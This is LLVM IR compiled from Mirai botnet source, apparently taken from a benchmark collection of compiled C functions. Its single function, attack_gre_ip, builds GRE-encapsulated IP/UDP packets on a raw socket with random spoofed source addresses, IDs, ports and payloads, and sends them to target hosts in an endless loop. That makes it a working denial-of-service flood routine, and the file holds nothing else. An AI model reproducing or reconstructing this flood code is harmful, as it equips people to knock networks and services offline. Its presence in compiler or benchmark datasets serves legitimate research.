; ModuleID = '/home/carl/AnghaBench/Mirai-Source-Code/mirai/bot/extr_attack_gre.c_attack_gre_ip.c'
source_filename = "/home/carl/AnghaBench/Mirai-Source-Code/mirai/bot/extr_attack_gre.c_attack_gre_ip.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_target = type { i32, i32, %struct.TYPE_4__ }
%struct.TYPE_4__ = type { i64, %struct.TYPE_3__, i32 }
%struct.TYPE_3__ = type { i32 }
%struct.attack_option = type { i32 }
%struct.iphdr = type { i32, i32, i32, i32, i32, i32, i32, i8*, i32, i8*, i8* }
%struct.grehdr = type { i8* }
%struct.udphdr = type { i32, i32, i8*, i64 }
%struct.sockaddr = type { i32 }

@ATK_OPT_IP_TOS = common dso_local global i32 0, align 4
@ATK_OPT_IP_IDENT = common dso_local global i32 0, align 4
@ATK_OPT_IP_TTL = common dso_local global i32 0, align 4
@ATK_OPT_IP_DF = common dso_local global i32 0, align 4
@TRUE = common dso_local global i32 0, align 4
@ATK_OPT_SPORT = common dso_local global i32 0, align 4
@ATK_OPT_DPORT = common dso_local global i32 0, align 4
@ATK_OPT_PAYLOAD_SIZE = common dso_local global i32 0, align 4
@ATK_OPT_PAYLOAD_RAND = common dso_local global i32 0, align 4
@ATK_OPT_GRE_CONSTIP = common dso_local global i32 0, align 4
@FALSE = common dso_local global i32 0, align 4
@ATK_OPT_SOURCE = common dso_local global i32 0, align 4
@LOCAL_ADDR = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@IPPROTO_IP = common dso_local global i32 0, align 4
@IP_HDRINCL = common dso_local global i32 0, align 4
@IPPROTO_GRE = common dso_local global i32 0, align 4
@ETH_P_IP = common dso_local global i32 0, align 4
@IPPROTO_UDP = common dso_local global i32 0, align 4
@MSG_NOSIGNAL = common dso_local global i32 0, align 4
@errno = common dso_local global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @attack_gre_ip(i32 %0, %struct.attack_target* %1, i32 %2, %struct.attack_option* %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.grehdr*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i8*, align 8
  store i32 %0, i32* %5, align 4
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i32 %2, i32* %7, align 4
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %32 = load i32, i32* %5, align 4
  %33 = call i8* @calloc(i32 %32, i32 8)
  %34 = bitcast i8* %33 to i8**
  store i8** %34, i8*** %11, align 8
  %35 = load i32, i32* %7, align 4
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = load i32, i32* @ATK_OPT_IP_TOS, align 4
  %38 = call i8* @attack_get_opt_int(i32 %35, %struct.attack_option* %36, i32 %37, i32 0)
  %39 = ptrtoint i8* %38 to i32
  store i32 %39, i32* %12, align 4
  %40 = load i32, i32* %7, align 4
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = load i32, i32* @ATK_OPT_IP_IDENT, align 4
  %43 = call i8* @attack_get_opt_int(i32 %40, %struct.attack_option* %41, i32 %42, i32 65535)
  %44 = ptrtoint i8* %43 to i32
  store i32 %44, i32* %13, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = load i32, i32* @ATK_OPT_IP_TTL, align 4
  %48 = call i8* @attack_get_opt_int(i32 %45, %struct.attack_option* %46, i32 %47, i32 64)
  %49 = ptrtoint i8* %48 to i32
  store i32 %49, i32* %14, align 4
  %50 = load i32, i32* %7, align 4
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = load i32, i32* @ATK_OPT_IP_DF, align 4
  %53 = load i32, i32* @TRUE, align 4
  %54 = call i8* @attack_get_opt_int(i32 %50, %struct.attack_option* %51, i32 %52, i32 %53)
  store i8* %54, i8** %15, align 8
  %55 = load i32, i32* %7, align 4
  %56 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %57 = load i32, i32* @ATK_OPT_SPORT, align 4
  %58 = call i8* @attack_get_opt_int(i32 %55, %struct.attack_option* %56, i32 %57, i32 65535)
  %59 = ptrtoint i8* %58 to i32
  store i32 %59, i32* %16, align 4
  %60 = load i32, i32* %7, align 4
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = load i32, i32* @ATK_OPT_DPORT, align 4
  %63 = call i8* @attack_get_opt_int(i32 %60, %struct.attack_option* %61, i32 %62, i32 65535)
  %64 = ptrtoint i8* %63 to i32
  store i32 %64, i32* %17, align 4
  %65 = load i32, i32* %7, align 4
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = load i32, i32* @ATK_OPT_PAYLOAD_SIZE, align 4
  %68 = call i8* @attack_get_opt_int(i32 %65, %struct.attack_option* %66, i32 %67, i32 512)
  %69 = ptrtoint i8* %68 to i32
  store i32 %69, i32* %18, align 4
  %70 = load i32, i32* %7, align 4
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = load i32, i32* @ATK_OPT_PAYLOAD_RAND, align 4
  %73 = load i32, i32* @TRUE, align 4
  %74 = call i8* @attack_get_opt_int(i32 %70, %struct.attack_option* %71, i32 %72, i32 %73)
  store i8* %74, i8** %19, align 8
  %75 = load i32, i32* %7, align 4
  %76 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %77 = load i32, i32* @ATK_OPT_GRE_CONSTIP, align 4
  %78 = load i32, i32* @FALSE, align 4
  %79 = call i8* @attack_get_opt_int(i32 %75, %struct.attack_option* %76, i32 %77, i32 %78)
  store i8* %79, i8** %20, align 8
  %80 = load i32, i32* %7, align 4
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = load i32, i32* @ATK_OPT_SOURCE, align 4
  %83 = load i32, i32* @LOCAL_ADDR, align 4
  %84 = call i8* @attack_get_opt_int(i32 %80, %struct.attack_option* %81, i32 %82, i32 %83)
  %85 = ptrtoint i8* %84 to i32
  store i32 %85, i32* %21, align 4
  %86 = load i32, i32* @AF_INET, align 4
  %87 = load i32, i32* @SOCK_RAW, align 4
  %88 = load i32, i32* @IPPROTO_TCP, align 4
  %89 = call i32 @socket(i32 %86, i32 %87, i32 %88)
  store i32 %89, i32* %10, align 4
  %90 = icmp eq i32 %89, -1
  br i1 %90, label %91, label %92

91:                                               ; preds = %4
  br label %432

92:                                               ; preds = %4
  store i32 1, i32* %9, align 4
  %93 = load i32, i32* %10, align 4
  %94 = load i32, i32* @IPPROTO_IP, align 4
  %95 = load i32, i32* @IP_HDRINCL, align 4
  %96 = call i32 @setsockopt(i32 %93, i32 %94, i32 %95, i32* %9, i32 4)
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %101

98:                                               ; preds = %92
  %99 = load i32, i32* %10, align 4
  %100 = call i32 @close(i32 %99)
  br label %432

101:                                              ; preds = %92
  store i32 0, i32* %9, align 4
  br label %102

102:                                              ; preds = %244, %101
  %103 = load i32, i32* %9, align 4
  %104 = load i32, i32* %5, align 4
  %105 = icmp slt i32 %103, %104
  br i1 %105, label %106, label %247

106:                                              ; preds = %102
  %107 = call i8* @calloc(i32 1510, i32 8)
  %108 = load i8**, i8*** %11, align 8
  %109 = load i32, i32* %9, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds i8*, i8** %108, i64 %110
  store i8* %107, i8** %111, align 8
  %112 = load i8**, i8*** %11, align 8
  %113 = load i32, i32* %9, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i8*, i8** %112, i64 %114
  %116 = load i8*, i8** %115, align 8
  %117 = bitcast i8* %116 to %struct.iphdr*
  store %struct.iphdr* %117, %struct.iphdr** %22, align 8
  %118 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %119 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %118, i64 1
  %120 = bitcast %struct.iphdr* %119 to %struct.grehdr*
  store %struct.grehdr* %120, %struct.grehdr** %23, align 8
  %121 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %122 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %121, i64 1
  %123 = bitcast %struct.grehdr* %122 to %struct.iphdr*
  store %struct.iphdr* %123, %struct.iphdr** %24, align 8
  %124 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %125 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %124, i64 1
  %126 = bitcast %struct.iphdr* %125 to %struct.udphdr*
  store %struct.udphdr* %126, %struct.udphdr** %25, align 8
  %127 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %128 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %127, i32 0, i32 0
  store i32 4, i32* %128, align 8
  %129 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %130 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %129, i32 0, i32 1
  store i32 5, i32* %130, align 4
  %131 = load i32, i32* %12, align 4
  %132 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %133 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %132, i32 0, i32 2
  store i32 %131, i32* %133, align 8
  %134 = load i32, i32* %18, align 4
  %135 = sext i32 %134 to i64
  %136 = add i64 160, %135
  %137 = trunc i64 %136 to i32
  %138 = call i8* @htons(i32 %137)
  %139 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %140 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %139, i32 0, i32 10
  store i8* %138, i8** %140, align 8
  %141 = load i32, i32* %13, align 4
  %142 = call i8* @htons(i32 %141)
  %143 = ptrtoint i8* %142 to i32
  %144 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %145 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %144, i32 0, i32 3
  store i32 %143, i32* %145, align 4
  %146 = load i32, i32* %14, align 4
  %147 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %148 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %147, i32 0, i32 4
  store i32 %146, i32* %148, align 8
  %149 = load i8*, i8** %15, align 8
  %150 = icmp ne i8* %149, null
  br i1 %150, label %151, label %155

151:                                              ; preds = %106
  %152 = call i8* @htons(i32 16384)
  %153 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i32 0, i32 9
  store i8* %152, i8** %154, align 8
  br label %155

155:                                              ; preds = %151, %106
  %156 = load i32, i32* @IPPROTO_GRE, align 4
  %157 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %158 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %157, i32 0, i32 8
  store i32 %156, i32* %158, align 8
  %159 = load i32, i32* %21, align 4
  %160 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i32 0, i32 5
  store i32 %159, i32* %161, align 4
  %162 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %163 = load i32, i32* %9, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %162, i64 %164
  %166 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %165, i32 0, i32 0
  %167 = load i32, i32* %166, align 8
  %168 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 6
  store i32 %167, i32* %169, align 8
  %170 = load i32, i32* @ETH_P_IP, align 4
  %171 = call i8* @htons(i32 %170)
  %172 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %173 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %172, i32 0, i32 0
  store i8* %171, i8** %173, align 8
  %174 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 0
  store i32 4, i32* %175, align 8
  %176 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 1
  store i32 5, i32* %177, align 4
  %178 = load i32, i32* %12, align 4
  %179 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 2
  store i32 %178, i32* %180, align 8
  %181 = load i32, i32* %18, align 4
  %182 = sext i32 %181 to i64
  %183 = add i64 88, %182
  %184 = trunc i64 %183 to i32
  %185 = call i8* @htons(i32 %184)
  %186 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 10
  store i8* %185, i8** %187, align 8
  %188 = load i32, i32* %13, align 4
  %189 = xor i32 %188, -1
  %190 = call i8* @htons(i32 %189)
  %191 = ptrtoint i8* %190 to i32
  %192 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %193 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %192, i32 0, i32 3
  store i32 %191, i32* %193, align 4
  %194 = load i32, i32* %14, align 4
  %195 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %196 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %195, i32 0, i32 4
  store i32 %194, i32* %196, align 8
  %197 = load i8*, i8** %15, align 8
  %198 = icmp ne i8* %197, null
  br i1 %198, label %199, label %203

199:                                              ; preds = %155
  %200 = call i8* @htons(i32 16384)
  %201 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %202 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %201, i32 0, i32 9
  store i8* %200, i8** %202, align 8
  br label %203

203:                                              ; preds = %199, %155
  %204 = load i32, i32* @IPPROTO_UDP, align 4
  %205 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %206 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %205, i32 0, i32 8
  store i32 %204, i32* %206, align 8
  %207 = call i32 (...) @rand_next()
  %208 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %209 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %208, i32 0, i32 5
  store i32 %207, i32* %209, align 4
  %210 = load i8*, i8** %20, align 8
  %211 = icmp ne i8* %210, null
  br i1 %211, label %212, label %218

212:                                              ; preds = %203
  %213 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %214 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %213, i32 0, i32 6
  %215 = load i32, i32* %214, align 8
  %216 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %217 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %216, i32 0, i32 6
  store i32 %215, i32* %217, align 8
  br label %226

218:                                              ; preds = %203
  %219 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %220 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %219, i32 0, i32 5
  %221 = load i32, i32* %220, align 4
  %222 = sub nsw i32 %221, 1024
  %223 = xor i32 %222, -1
  %224 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %225 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %224, i32 0, i32 6
  store i32 %223, i32* %225, align 8
  br label %226

226:                                              ; preds = %218, %212
  %227 = load i32, i32* %16, align 4
  %228 = call i8* @htons(i32 %227)
  %229 = ptrtoint i8* %228 to i32
  %230 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %231 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %230, i32 0, i32 0
  store i32 %229, i32* %231, align 8
  %232 = load i32, i32* %17, align 4
  %233 = call i8* @htons(i32 %232)
  %234 = ptrtoint i8* %233 to i32
  %235 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %236 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %235, i32 0, i32 1
  store i32 %234, i32* %236, align 4
  %237 = load i32, i32* %18, align 4
  %238 = sext i32 %237 to i64
  %239 = add i64 24, %238
  %240 = trunc i64 %239 to i32
  %241 = call i8* @htons(i32 %240)
  %242 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %243 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %242, i32 0, i32 2
  store i8* %241, i8** %243, align 8
  br label %244

244:                                              ; preds = %226
  %245 = load i32, i32* %9, align 4
  %246 = add nsw i32 %245, 1
  store i32 %246, i32* %9, align 4
  br label %102

247:                                              ; preds = %102
  br label %248

248:                                              ; preds = %431, %247
  %249 = load i32, i32* @TRUE, align 4
  %250 = icmp ne i32 %249, 0
  br i1 %250, label %251, label %432

251:                                              ; preds = %248
  store i32 0, i32* %9, align 4
  br label %252

252:                                              ; preds = %428, %251
  %253 = load i32, i32* %9, align 4
  %254 = load i32, i32* %5, align 4
  %255 = icmp slt i32 %253, %254
  br i1 %255, label %256, label %431

256:                                              ; preds = %252
  %257 = load i8**, i8*** %11, align 8
  %258 = load i32, i32* %9, align 4
  %259 = sext i32 %258 to i64
  %260 = getelementptr inbounds i8*, i8** %257, i64 %259
  %261 = load i8*, i8** %260, align 8
  store i8* %261, i8** %26, align 8
  %262 = load i8*, i8** %26, align 8
  %263 = bitcast i8* %262 to %struct.iphdr*
  store %struct.iphdr* %263, %struct.iphdr** %27, align 8
  %264 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %265 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %264, i64 1
  %266 = bitcast %struct.iphdr* %265 to %struct.grehdr*
  store %struct.grehdr* %266, %struct.grehdr** %28, align 8
  %267 = load %struct.grehdr*, %struct.grehdr** %28, align 8
  %268 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %267, i64 1
  %269 = bitcast %struct.grehdr* %268 to %struct.iphdr*
  store %struct.iphdr* %269, %struct.iphdr** %29, align 8
  %270 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %271 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %270, i64 1
  %272 = bitcast %struct.iphdr* %271 to %struct.udphdr*
  store %struct.udphdr* %272, %struct.udphdr** %30, align 8
  %273 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %274 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %273, i64 1
  %275 = bitcast %struct.udphdr* %274 to i8*
  store i8* %275, i8** %31, align 8
  %276 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %277 = load i32, i32* %9, align 4
  %278 = sext i32 %277 to i64
  %279 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %276, i64 %278
  %280 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %279, i32 0, i32 1
  %281 = load i32, i32* %280, align 4
  %282 = icmp slt i32 %281, 32
  br i1 %282, label %283, label %304

283:                                              ; preds = %256
  %284 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %285 = load i32, i32* %9, align 4
  %286 = sext i32 %285 to i64
  %287 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %284, i64 %286
  %288 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %287, i32 0, i32 0
  %289 = load i32, i32* %288, align 8
  %290 = call i64 @ntohl(i32 %289)
  %291 = call i32 (...) @rand_next()
  %292 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %293 = load i32, i32* %9, align 4
  %294 = sext i32 %293 to i64
  %295 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %292, i64 %294
  %296 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %295, i32 0, i32 1
  %297 = load i32, i32* %296, align 4
  %298 = ashr i32 %291, %297
  %299 = sext i32 %298 to i64
  %300 = add nsw i64 %290, %299
  %301 = call i32 @htonl(i64 %300)
  %302 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %303 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %302, i32 0, i32 6
  store i32 %301, i32* %303, align 8
  br label %304

304:                                              ; preds = %283, %256
  %305 = load i32, i32* %21, align 4
  %306 = icmp eq i32 %305, -1
  br i1 %306, label %307, label %311

307:                                              ; preds = %304
  %308 = call i32 (...) @rand_next()
  %309 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %310 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %309, i32 0, i32 5
  store i32 %308, i32* %310, align 4
  br label %311

311:                                              ; preds = %307, %304
  %312 = load i32, i32* %13, align 4
  %313 = icmp eq i32 %312, 65535
  br i1 %313, label %314, label %326

314:                                              ; preds = %311
  %315 = call i32 (...) @rand_next()
  %316 = and i32 %315, 65535
  %317 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %318 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %317, i32 0, i32 3
  store i32 %316, i32* %318, align 4
  %319 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %320 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %319, i32 0, i32 3
  %321 = load i32, i32* %320, align 4
  %322 = sub nsw i32 %321, 1000
  %323 = xor i32 %322, -1
  %324 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %325 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %324, i32 0, i32 3
  store i32 %323, i32* %325, align 4
  br label %326

326:                                              ; preds = %314, %311
  %327 = load i32, i32* %16, align 4
  %328 = icmp eq i32 %327, 65535
  br i1 %328, label %329, label %334

329:                                              ; preds = %326
  %330 = call i32 (...) @rand_next()
  %331 = and i32 %330, 65535
  %332 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %333 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %332, i32 0, i32 0
  store i32 %331, i32* %333, align 8
  br label %334

334:                                              ; preds = %329, %326
  %335 = load i32, i32* %17, align 4
  %336 = icmp eq i32 %335, 65535
  br i1 %336, label %337, label %342

337:                                              ; preds = %334
  %338 = call i32 (...) @rand_next()
  %339 = and i32 %338, 65535
  %340 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %341 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %340, i32 0, i32 1
  store i32 %339, i32* %341, align 4
  br label %342

342:                                              ; preds = %337, %334
  %343 = load i8*, i8** %20, align 8
  %344 = icmp ne i8* %343, null
  br i1 %344, label %349, label %345

345:                                              ; preds = %342
  %346 = call i32 (...) @rand_next()
  %347 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %348 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %347, i32 0, i32 6
  store i32 %346, i32* %348, align 8
  br label %355

349:                                              ; preds = %342
  %350 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %351 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %350, i32 0, i32 6
  %352 = load i32, i32* %351, align 8
  %353 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %354 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %353, i32 0, i32 6
  store i32 %352, i32* %354, align 8
  br label %355

355:                                              ; preds = %349, %345
  %356 = load i8*, i8** %19, align 8
  %357 = icmp ne i8* %356, null
  br i1 %357, label %358, label %362

358:                                              ; preds = %355
  %359 = load i8*, i8** %31, align 8
  %360 = load i32, i32* %18, align 4
  %361 = call i32 @rand_str(i8* %359, i32 %360)
  br label %362

362:                                              ; preds = %358, %355
  %363 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %364 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %363, i32 0, i32 7
  store i8* null, i8** %364, align 8
  %365 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %366 = bitcast %struct.iphdr* %365 to i32*
  %367 = call i8* @checksum_generic(i32* %366, i32 64)
  %368 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %369 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %368, i32 0, i32 7
  store i8* %367, i8** %369, align 8
  %370 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %371 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %370, i32 0, i32 7
  store i8* null, i8** %371, align 8
  %372 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %373 = bitcast %struct.iphdr* %372 to i32*
  %374 = call i8* @checksum_generic(i32* %373, i32 64)
  %375 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %376 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %375, i32 0, i32 7
  store i8* %374, i8** %376, align 8
  %377 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %378 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %377, i32 0, i32 3
  store i64 0, i64* %378, align 8
  %379 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %380 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %381 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %382 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %381, i32 0, i32 2
  %383 = load i8*, i8** %382, align 8
  %384 = load i32, i32* %18, align 4
  %385 = sext i32 %384 to i64
  %386 = add i64 24, %385
  %387 = trunc i64 %386 to i32
  %388 = call i64 @checksum_tcpudp(%struct.iphdr* %379, %struct.udphdr* %380, i8* %383, i32 %387)
  %389 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %390 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %389, i32 0, i32 3
  store i64 %388, i64* %390, align 8
  %391 = load i32, i32* @AF_INET, align 4
  %392 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %393 = load i32, i32* %9, align 4
  %394 = sext i32 %393 to i64
  %395 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %392, i64 %394
  %396 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %395, i32 0, i32 2
  %397 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %396, i32 0, i32 2
  store i32 %391, i32* %397, align 4
  %398 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %399 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %398, i32 0, i32 6
  %400 = load i32, i32* %399, align 8
  %401 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %402 = load i32, i32* %9, align 4
  %403 = sext i32 %402 to i64
  %404 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %401, i64 %403
  %405 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %404, i32 0, i32 2
  %406 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %405, i32 0, i32 1
  %407 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %406, i32 0, i32 0
  store i32 %400, i32* %407, align 8
  %408 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %409 = load i32, i32* %9, align 4
  %410 = sext i32 %409 to i64
  %411 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %408, i64 %410
  %412 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %411, i32 0, i32 2
  %413 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %412, i32 0, i32 0
  store i64 0, i64* %413, align 8
  %414 = load i32, i32* %10, align 4
  %415 = load i8*, i8** %26, align 8
  %416 = load i32, i32* %18, align 4
  %417 = sext i32 %416 to i64
  %418 = add i64 160, %417
  %419 = trunc i64 %418 to i32
  %420 = load i32, i32* @MSG_NOSIGNAL, align 4
  %421 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %422 = load i32, i32* %9, align 4
  %423 = sext i32 %422 to i64
  %424 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %421, i64 %423
  %425 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %424, i32 0, i32 2
  %426 = bitcast %struct.TYPE_4__* %425 to %struct.sockaddr*
  %427 = call i32 @sendto(i32 %414, i8* %415, i32 %419, i32 %420, %struct.sockaddr* %426, i32 4)
  br label %428

428:                                              ; preds = %362
  %429 = load i32, i32* %9, align 4
  %430 = add nsw i32 %429, 1
  store i32 %430, i32* %9, align 4
  br label %252

431:                                              ; preds = %252
  br label %248

432:                                              ; preds = %91, %98, %248
  ret void
}

declare dso_local i8* @calloc(i32, i32) #1

declare dso_local i8* @attack_get_opt_int(i32, %struct.attack_option*, i32, i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @setsockopt(i32, i32, i32, i32*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i32 @rand_next(...) #1

declare dso_local i32 @htonl(i64) #1

declare dso_local i64 @ntohl(i32) #1

declare dso_local i32 @rand_str(i8*, i32) #1

declare dso_local i8* @checksum_generic(i32*, i32) #1

declare dso_local i64 @checksum_tcpudp(%struct.iphdr*, %struct.udphdr*, i8*, i32) #1

declare dso_local i32 @sendto(i32, i8*, i32, i32, %struct.sockaddr*, i32) #1

